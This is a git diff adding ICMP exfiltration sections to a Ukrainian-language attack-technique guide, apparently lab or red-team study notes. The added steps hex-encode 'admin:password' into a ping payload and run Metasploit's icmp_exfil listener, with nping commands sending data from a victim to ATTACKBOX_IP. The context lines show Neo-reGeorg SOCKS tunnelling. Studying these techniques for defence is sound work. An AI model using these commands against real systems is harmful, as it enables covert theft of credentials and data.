@@ -327,3 +327,57 @@ python3 neoreg.py -k q1w2e3r4 -u http://192.168.1.1/uploader/files/tunnel.php
 curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
 ```
 Neo-reGeorg форвардить трафік через локальний SOCKS, curl піде тунелем, якщо сам тунель активний і віддалений агент має доступ до цільової адреси, ми отримаємо доступ до внутрішніх ресурсів.
+
+## 📡 12. Ping
+
+За допомогою аргумента -p ми можемо вказати 16 байтів даних у шістнадцятковому представленні для надсилання через пакет.
+
+```
+echo "admin:password" | xxd -p 
+61646d696e3a70617373776f72640a
+```
+після цього 
+
+```
+ping 10.10.126.240 -c 1 -p 61646d696e3a70617373776f72640a
+```
+
+## 📡 13. Metasploit
+
+Встановіть BPF_FILTER у msf5 на атакері
+```
+msf5 > use auxiliary/server/icmp_exfil
+msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
+BPF_FILTER => icmp and not src ATTACKBOX_IP
+```
+налаштувати на відповідний мережевий інтерфейс
+```
+msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
+INTERFACE => eth0
+msf5 auxiliary(server/icmp_exfil) > run
+```
+На машині жертви запустити тригер
+```
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+```
+після цього надсилаємо дані
+```
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+```
+по завершенню
+```
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+```
+
+
+
+
+
+
+
+
+
+
+
+
+-------------------
